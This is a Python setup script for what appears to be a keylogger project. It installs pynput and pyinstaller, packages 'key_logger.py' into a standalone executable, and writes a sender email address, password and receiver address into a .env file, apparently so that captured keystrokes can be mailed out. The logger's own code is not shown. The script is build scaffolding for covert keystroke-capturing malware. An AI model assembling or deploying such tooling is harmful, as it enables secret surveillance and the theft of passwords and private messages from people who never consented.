import os


def setup():
    os.system("pip install pyinstaller")
    os.system("pip install python-dotenv")
    os.system("pip install pynput")
    os.system("pip install tkinter")
    os.system("pyinstaller --onefile key_logger.py")

    
def create_config(mailid,passwd,rec_mail):
    with open(".env","w") as f:
        f.writelines([
            f"EMAIL={mailid}\n",
            f"PASSWORD={passwd}\n",
            f"RECIEVER_MAIL={rec_mail}\n"
        ])
    

mailid=input("Enter the sender MailId:")
passwd=input("Enter the password:")
rec_mail=input("Enter the reciever Mail:")
setup()
create_config(mailid,passwd,rec_mail)